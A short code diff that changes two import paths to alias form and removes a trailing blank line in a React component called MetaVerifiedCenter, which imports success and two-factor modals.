@@ -8,8 +8,8 @@ import SuccessModal from '#components/modals/SuccessModal'
 import TwoFactorModal from '#components/modals/TwoFactorModal'
 import Image from 'next/image'
 import React from 'react'
-import { useAppDispatch, useAppSelector } from '../store/hooks'
-import { updateForm } from '../store/slices/stepFormSlice'
+import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
+import { updateForm } from '@/app/store/slices/stepFormSlice'
 
 const MetaVerifiedCenter = () => {
     // STATE MODAL
@@ -148,4 +148,3 @@ const MetaVerifiedCenter = () => {
 }
 
 export default MetaVerifiedCenter
-
